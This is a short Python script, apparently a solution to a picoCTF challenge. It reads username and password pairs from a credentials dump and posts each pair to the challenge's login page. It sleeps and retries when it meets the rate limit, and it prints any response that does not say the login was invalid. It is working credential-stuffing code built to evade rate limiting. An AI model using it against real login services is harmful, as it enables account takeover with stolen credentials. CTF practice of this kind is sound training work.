import requests
import time
from utils.pretty_print import pretty_print
url = "http://candy-mountain.picoctf.net:50764/login"
i=1


with open("/home/kali/Downloads/creds-dump.txt") as f:
    for line in f:
        line_clean = line.strip()
        username,password = line_clean.split(';')
        data1 = {
            "username": username,
            "password": password
        }
        print(f"trying username {username} and password {password}")
        
        res = requests.post(url, data=data1)
        i+=1
        if(i>=9):
            time.sleep(33)
            i=1
        if 'too many requests' in res.text:
            #go to sleep, and try again
            time.sleep(120)
            res = requests.post(url, data=data1)
        if 'Invalid' not in res.text:
            pretty_print(res)

